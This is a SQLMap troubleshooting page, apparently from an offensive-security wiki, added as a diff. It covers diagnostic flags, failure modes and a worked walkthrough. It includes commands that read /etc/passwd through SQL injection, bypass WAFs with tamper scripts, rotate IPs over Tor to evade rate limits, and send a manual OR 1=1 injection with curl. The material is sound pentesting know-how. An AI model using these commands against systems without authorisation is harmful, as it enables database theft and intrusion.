@@ -1,0 +1,476 @@
+---
+title: Troubleshooting
+description: Diagnosing SQLMap runs that don't behave - surfacing DBMS errors with --parse-errors, capturing full traffic via -t and --proxy, raising verbosity with -v, clearing stale state with --flush-session, and reading the common failure modes (response noise, dynamic content, reflected payloads, anti-automation defenses) for what they really mean.
+mitre: [T1190]
+d3fend: []
+sidebar:
+  order: 7
+  label: Troubleshooting
+---
+
+## TL;DR
+
+SQLMap runs fail in distinctive ways and each failure mode has a tell. Five tools cover most diagnostic work:
+
+```
+# 1. Show DBMS error text in the run output
+sqlmap -u '...' --parse-errors
+
+# 2. Log all HTTP traffic to a file for offline inspection
+sqlmap -u '...' -t /tmp/traffic.txt --batch
+
+# 3. Crank verbosity to see every payload as it goes out
+sqlmap -u '...' -v 6
+
+# 4. Send all traffic through Burp for live inspection
+sqlmap -u '...' --proxy=http://127.0.0.1:8080
+
+# 5. Throw out cached state and start clean
+sqlmap -u '...' --flush-session
+```
+
+Success indicator: when something isn't working, you can tell whether it's the request specification, the target's response behavior, a WAF, or genuine "not exploitable" - and the right next step follows from that.
+
+## The diagnostic mindset
+
+When SQLMap reports `all tested parameters do not appear to be injectable`, there are four meaningfully different reasons:
+
+1. **The parameter genuinely isn't injectable.** No SQL reaches the database with attacker-controlled input.
+2. **The parameter is injectable but SQLMap's payloads don't reach the right context.** Needs different boundaries (`--prefix`/`--suffix`) or higher coverage (`--level`/`--risk`).
+3. **A WAF is filtering the payloads before they reach the DB.** Needs `--tamper`, `--random-agent`, or both.
+4. **The request itself is wrong.** Wrong content-type, missing cookie, expired CSRF token - SQLMap's payloads are never being processed at all.
+
+Most failed SQLMap runs land in (4) or (3). Knowing which one requires reading the actual HTTP traffic - which is why every troubleshooting workflow starts with making the traffic visible.
+
+## Tool 1 - `--parse-errors`
+
+The fastest first move. SQLMap normally silently discards DBMS errors that aren't part of an exploitation payload. With `--parse-errors`, it prints them:
+
+```shell
+sqlmap -u 'http://target/vuln.php?id=1' --parse-errors --batch
+```
+
+```
+[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
+[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
+[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax for the right syntax to use near ''YzDZJELylInm' at line 1'
+```
+
+What you learn from the error text:
+
+- **Quote style.** The error here shows `'YzDZJELylInm'` - single quote context. So payloads need to break out of a single-quoted string. (Confirms what `--prefix='` would do.)
+- **Bracket structure.** The first error shows `'))"',),)((` - the original query has nested parentheses around the parameter. Suggests `--prefix='))` or similar.
+- **DBMS confirmation.** `SQLSTATE[42000]: Syntax error or access violation: 1064` is a MySQL pattern. The `1064` is MySQL's syntax-error code.
+- **Schema disclosure.** Sometimes the error embeds the column name or table name - gives you free reconnaissance.
+
+When `--parse-errors` shows nothing, the target has either error suppression enabled in PHP (`display_errors = Off` in `php.ini`) or generic error pages - see "Targets without error messages" below.
+
+## Tool 2 - Traffic logging with `-t`
+
+The `-t` flag writes every HTTP request and response to a file:
+
+```shell
+sqlmap -u 'http://target/vuln.php?id=1' --batch -t /tmp/traffic.txt
+```
+
+```shell
+$ cat /tmp/traffic.txt
+HTTP request [#1]:
+GET /?id=1 HTTP/1.1
+Host: target.com
+Cache-control: no-cache
+Accept-encoding: gzip,deflate
+Accept: */*
+User-agent: sqlmap/1.7.2 (http://sqlmap.org)
+Connection: close
+
+HTTP response [#1] (200 OK):
+Date: Thu, 24 Sep 2024 14:12:50 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+Content-Length: 914
+
+<!DOCTYPE html>
+<html>...
+```
+
+Each request/response pair is numbered. For a typical scan, the file ends up large (megabytes to tens of megabytes). Open it in a text editor and:
+
+1. Scan for the first few requests - confirm headers, cookies, body all look right.
+2. Search for `400`, `403`, `406`, `503` - WAF or auth-failure responses.
+3. Search for the parameter value - confirm SQLMap's payloads actually appear in the right place.
+4. Search for distinctive error keywords (`SQLSTATE`, `Warning:`, `mysql`, `error`) - DBMS errors that might be hidden in the rendered page.
+
+This is the canonical "is SQLMap doing what I think it's doing?" answer.
+
+## Tool 3 - Verbosity with `-v`
+
+`-v` takes a level from 0 (quietest) to 6 (loudest). Each step exposes more detail:
+
+| Level | What it adds |
+| --- | --- |
+| 0 | Errors and critical only |
+| 1 | Default - info, warnings, hits |
+| 2 | Debug-info - connection details, request counts |
+| 3 | **Every `[PAYLOAD]` line** - see what payloads SQLMap is trying |
+| 4 | Full HTTP request body for each test |
+| 5 | Full HTTP response body for each test |
+| 6 | Everything - every byte sent and received |
+
+The most-used levels:
+
+```shell
+# Level 3 - see payloads as they go out (most common diagnostic level)
+sqlmap -u '...' -v 3
+
+# Level 6 - full real-time trace
+sqlmap -u '...' -v 6 2>&1 | tee /tmp/full-trace.txt
+```
+
+Sample `-v 3` output:
+
+```
+[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:42:38] [PAYLOAD] 1 AND 5907=7031-- AuiO
+[14:42:38] [PAYLOAD] 1 AND 7891=5700 AND (3236=3236
+[14:42:38] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz
+[14:42:38] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY
+[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+```
+
+This lets you:
+
+- Confirm the boundaries SQLMap is trying (single-quote, double-quote, parenthesis combinations)
+- Spot when payloads contain characters that may be getting filtered (`'`, `=`, `>`, spaces)
+- Notice when the payload's column count for UNION attempts isn't matching the actual query column count
+
+## Tool 4 - Proxy through Burp
+
+```shell
+sqlmap -u 'http://target/vuln.php?id=1' --proxy=http://127.0.0.1:8080
+```
+
+Burp's HTTP history then shows every SQLMap request as it goes by - with all the inspection, replay, and rewriting tools Burp provides.
+
+Operational use:
+
+- **Replaying a specific payload manually.** SQLMap claims `id=1' AND 5907=7031-- AuiO` is injectable; you want to verify by hand. Right-click in Burp history → Send to Repeater → adjust → send.
+- **Watching for WAF interference.** When you see `403 Forbidden` for one specific payload but `200 OK` for others, you've found the WAF's filter pattern.
+- **Active rewriting.** Burp Intercept on, modify SQLMap's payload before it goes out, see if a small variation works.
+
+For HTTPS targets, also pass `--ignore-certs` or `--force-ssl`:
+
+```shell
+sqlmap -u 'https://target/vuln.php?id=1' \
+       --proxy=http://127.0.0.1:8080 \
+       --force-ssl
+```
+
+If Burp's CA cert isn't trusted, SQLMap will warn about the certificate but `--ignore-certs` bypasses that:
+
+```shell
+sqlmap -u '...' --proxy=http://127.0.0.1:8080 --ignore-certs
+```
+
+## Tool 5 - Flushing session state
+
+SQLMap caches everything per-target in `~/.sqlmap/output/<host>/`. When state is stale or wrong (e.g., you fixed a request spec error but SQLMap is still using the old detection result):
+
+```shell
+# Throw out all cached state for this target
+sqlmap -u 'http://target/vuln.php?id=1' --flush-session
+
+# Or delete the directory directly
+rm -rf ~/.sqlmap/output/target
+rm -rf ~/.local/share/sqlmap/output/target   # newer Linux
+```
+
+`--purge` does even more - removes the entire SQLMap output directory:
+
+```shell
+sqlmap --purge
+```
+
+When to flush:
+
+- Re-running after fixing the request spec, and SQLMap is still reporting "not injectable" from the broken run
+- After the target has been patched and you want to verify the patch
+- When `sqlmap resumed the following injection point(s) from stored session:` mentions a payload that no longer works
+- Before reporting - clean session ensures the captured payloads are current
+
+## Common failure modes
+
+### "all tested parameters do not appear to be injectable"
+
+The top-level fail. Walk down this checklist:
+
+**1. Is the parameter actually reaching the database?**
+
+- Test with `-v 3` and watch payloads. Try a parameter value that should produce a visible difference (e.g., a known existing record ID vs a guaranteed-nonexistent one).
+- If both responses look identical, the parameter isn't dynamic - SQLMap will say `GET parameter '...' does not appear to be dynamic`.
+
+**2. Is the request spec right?**
+
+- For POST data, check the Content-Type. JSON bodies need `-H 'Content-Type: application/json'`.
+- For session-dependent endpoints, did you pass the cookie? `--cookie="..."` or include it in the request file with `-r`.
+- For CSRF-protected forms, did you specify `--csrf-token`?
+- For HTTPS, did you reach the right host? Sometimes `http://` redirects somewhere that breaks the data flow.
+
+**3. Are the boundaries default-supported?**
+
+- Default SQLMap tries ~70 boundary patterns. Less common contexts (e.g., the parameter inside a JSON-encoded field within a JSON-encoded field, or inside a LIKE clause with backticks) aren't covered.
+- Raise coverage: `--level=5 --risk=3` tries the full ~7,800-payload matrix.
+- If you know the context, force it: `--prefix="')" --suffix="-- -"`.
+
+**4. Is a WAF filtering?**
+
+- `--parse-errors` shows nothing → could be error suppression OR could be WAF stripping payloads.
+- `-v 6` and look for `406 Not Acceptable`, `403 Forbidden`, or distinctive WAF banners in responses (`<title>Access Denied</title>`, `ModSecurity`, `Cloudflare Ray ID`).
+- Try `--tamper=between,space2comment --random-agent` as a first pass. See [WAF Bypass](/codex/web/sqli/sqlmap/waf-bypass/) for the full bypass toolkit.
+
+### "the back-end DBMS is X" but enumeration fails
+
+SQLMap confirmed injection but `--dbs`, `--tables`, or `--dump` returns nothing or hangs.
+
+**Cause: the working technique is time-based blind.** Time-based extraction is extremely slow - one bit per N-second sleep per query. A full `--dump` against a 10-row table can take 30+ minutes.
+
+```
+Type: time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: id=1 AND (SELECT 8814 FROM (SELECT(SLEEP(5)))kkXz)
+```
+
+If the only confirmed technique is `T`, expect slow extraction. Options:
+
+- **Shorten the sleep time.** `--time-sec=2` instead of the default 5. Risk: false-positive timing differential on a noisy network.
+- **Force a different technique.** If `--technique=BE` or `--technique=U` was rejected in detection, retry detection with `--level=5 --risk=3` to broaden the boundary set - sometimes a working UNION payload exists at higher levels but wasn't tried at default.
+- **Use `--threads=10`** to parallelize. Each thread extracts a different character simultaneously.
+
+### "no data retrieved" on `--file-read` or `--dump`
+
+The injection works but specific operations return nothing.
+
+**Common cause: not DBA, or `secure_file_priv` set, or LOAD_FILE returns NULL silently.**
+
+```shell
+# Verify privilege
+sqlmap -u '...' --is-dba
+```
+
+If `current user is DBA: False`, file read is unlikely to work. See [OS Exploitation](/codex/web/sqli/sqlmap/os-exploitation/) for the privilege requirements per-DBMS.
+
+**Another cause: result-size or output-encoding limits.**
+
+```shell
+# Try forcing hex encoding of the output - bypasses string-handling issues
+sqlmap -u '...' --file-read=/etc/passwd --hex
+
+# Disable the cast wrapper - sometimes the CAST(... AS NCHAR) breaks output
+sqlmap -u '...' --file-read=/etc/passwd --no-cast
+```
+
+The `--no-cast` and `--hex` hints come from SQLMap itself when problems occur:
+
+```
+[WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+```
+
+### "reflective value(s) found and filtering out"
+
+Not actually a failure - but worth knowing. Means the payload (or random tokens within it) is being echoed back in the response. SQLMap auto-filters this noise from response comparison.
+
+If detection still fails *because of* reflection, force the comparison source:
+
+```shell
+sqlmap -u '...' --string='success'         # match on a known TRUE-response string
+sqlmap -u '...' --not-string='error'       # match on absence of a FALSE-response string
+sqlmap -u '...' --code=200                 # match on HTTP code
+sqlmap -u '...' --titles                   # match on HTML <title> differences
+sqlmap -u '...' --text-only                # strip HTML tags before comparison
+```
+
+These tell SQLMap exactly what differentiates TRUE from FALSE responses, sidestepping the auto-detect.
+
+### Responses are too inconsistent for detection
+
+When the same parameter value returns different responses across requests (e.g., a banner ad shuffles, a timestamp changes), SQLMap's response-differential logic gets confused:
+
+```
+[WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher
+```
+
+Workarounds:
+
+```shell
+# Force "always true" detection regardless of noise - use only as a last resort
+sqlmap -u '...' --not-string='login required'
+
+# Or pin to HTTP-code-only matching, which usually is stable
+sqlmap -u '...' --code=200
+```
+
+### Targets without error messages
+
+When the target suppresses errors (PHP `display_errors=Off`, generic error pages), `--parse-errors` returns nothing useful and error-based exploitation (E technique) won't work.
+
+Workflow:
+
+1. Confirm the parameter is dynamic via `-v 3` - SQLMap should still detect that changing the value changes the response.
+2. Push for blind detection at higher levels: `--level=5 --risk=3 --technique=BT`.
+3. If B and T both fail, the parameter likely isn't reaching the DBMS in an exploitable way.
+
+### Anti-CSRF tokens expiring mid-scan
+
+```shell
+sqlmap -u '...' --csrf-token="csrfmiddlewaretoken"
+```
+
+When this works initially but fails after a few minutes, the session is expiring:
+
+```shell
+# Refresh the token by hitting a known good page first
+sqlmap -u '...' --csrf-token="csrfmiddlewaretoken" \
+       --csrf-url='http://target/login/'        # URL that always returns a fresh token
+```
+
+For complex auth flows, see also `--auth-cred`, `--auth-type` for HTTP basic/digest, and the `--load-cookies` flag for Firefox-export cookies.
+
+### Rate-limited / blocked partway through
+
+After a few hundred requests, responses change to 429, 503, or just hang:
+
+```shell
+# Slow down
+sqlmap -u '...' --delay=2          # 2-second delay between requests
+sqlmap -u '...' --safe-freq=10     # every 10 risky requests, hit a "safe" URL to keep session alive
+
+# Retry timing
+sqlmap -u '...' --retries=5        # retries per request (default 3)
+sqlmap -u '...' --timeout=60       # per-request timeout (default 30)
+
+# Or rotate IPs
+sqlmap -u '...' --proxy-file=proxies.txt
+sqlmap -u '...' --tor --tor-type=SOCKS5
+```
+
+When `--tor` is used, also `--check-tor` to verify the SOCKS proxy actually anonymizes.
+
+## When SQLMap is doing the right thing but slowly
+
+Some progress indicators that look like hangs but aren't:
+
+```
+[INFO] time-based comparison requires a larger statistical model, please wait...........
+```
+
+SQLMap is gathering baseline response-time samples. Expected to take 10-60 seconds. Wait.
+
+```
+[INFO] adjusting time delay to 1 second due to good response times
+```
+
+Auto-tuning. Wait.
+
+```
+[INFO] retrieved: 'r'
+[INFO] retrieved: 'ro'
+[INFO] retrieved: 'roo'
+```
+
+Time-based extraction, one character at a time. Each character is a binary search over 8 bits with one SLEEP-anchored query per bit. Faster than it looks - the printed-character cadence is the right rhythm.
+
+```
+[INFO] resuming back-end DBMS 'mysql' from stored session
+```
+
+Session reuse. SQLMap is skipping detection because it already finished detection on a prior run. Fine - and faster than re-running detection.
+
+## Diagnostic walk-through
+
+A worked example. Suppose:
+
+```
+[INFO] testing connection to the target URL
+[INFO] checking if the target is protected by some kind of WAF/IPS
+[INFO] testing if the target URL content is stable
+[WARNING] GET parameter 'id' does not appear to be dynamic
+[INFO] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[WARNING] all tested parameters do not appear to be injectable
+```
+
+Walk:
+
+1. **"`id` does not appear to be dynamic"** - strong signal. Test manually:
+
+   ```shell
+   curl 'http://target/vuln.php?id=1'
+   curl 'http://target/vuln.php?id=999999'
+   ```
+
+   If responses are identical: the parameter isn't being processed. Maybe the app uses POST not GET for this parameter, or it expects a different name, or there's a 30x redirect stripping the query string.
+
+2. **Check redirects.** A common trap:
+
+   ```shell
+   curl -I 'http://target/vuln.php?id=1'
+   # HTTP/1.1 301 Moved Permanently
+   # Location: https://target/vuln.php
+   ```
+
+   The query string was stripped in the redirect. Specify `--force-ssl` and `https://`.
+
+3. **Re-test with `-v 3 --skip-static`:**
+
+   ```shell
+   sqlmap -u '...' -v 3 --skip-static
+   ```
+
+   `--skip-static` tells SQLMap to test even parameters it would normally classify as static. Sometimes its dynamic-detection is wrong.
+
+4. If still failing, **broaden coverage**:
+
+   ```shell
+   sqlmap -u '...' --level=5 --risk=3
+   ```
+
+5. If still failing, **manual one-shot test** - does manual SQL injection even work?
+
+   ```shell
+   curl 'http://target/vuln.php?id=1%27%20OR%201=1--%20-'
+   ```
+
+   Compare to baseline. If the manual test changes the response, SQLMap's request spec is wrong. If it doesn't, the target probably isn't injectable.
+
+## Quick reference
+
+| Flag | Effect |
+| --- | --- |
+| `--parse-errors` | Print DBMS error text in scan log |
+| `-t FILE` | Write every HTTP request and response to FILE |
+| `-v 0..6` | Verbosity level (3 = see payloads, 6 = full trace) |
+| `--proxy URL` | Route traffic through proxy (Burp at `http://127.0.0.1:8080`) |
+| `--ignore-certs` | Don't validate TLS certs (Burp without CA installed) |
+| `--force-ssl` | Force HTTPS to target |
+| `--flush-session` | Discard cached detection/enumeration state for this target |
+| `--purge` | Delete the entire SQLMap output directory |
+| `--skip-static` | Test parameters even if classified as static |
+| `--no-cast` | Skip CAST() wrapper on extraction queries |
+| `--hex` | Force hex encoding on extracted data |
+| `--string TEXT` | TRUE responses contain this string |
+| `--not-string TEXT` | FALSE responses contain this string |
+| `--code N` | TRUE responses return HTTP code N |
+| `--titles` | Compare `<title>` tags rather than full body |
+| `--text-only` | Strip HTML tags before response comparison |
+| `--time-sec N` | Seconds for time-based SLEEP (default 5) |
+| `--delay N` | Seconds between requests (rate-limit defense) |
+| `--safe-url URL` | "Safe" URL to hit periodically to keep session alive |
+| `--safe-freq N` | Every N risky requests, hit `--safe-url` |
+| `--retries N` | Retries per failing request (default 3) |
+| `--timeout N` | Per-request timeout in seconds (default 30) |
+| `--threads N` | Concurrent requests (max 10) for parallel extraction |
+| `--csrf-token NAME` | Auto-refresh anti-CSRF token field |
+| `--csrf-url URL` | URL to fetch fresh CSRF token from |
+| `--load-cookies FILE` | Load Firefox-exported cookies |
+| `--check-tor` | Verify Tor proxy is actually anonymizing |
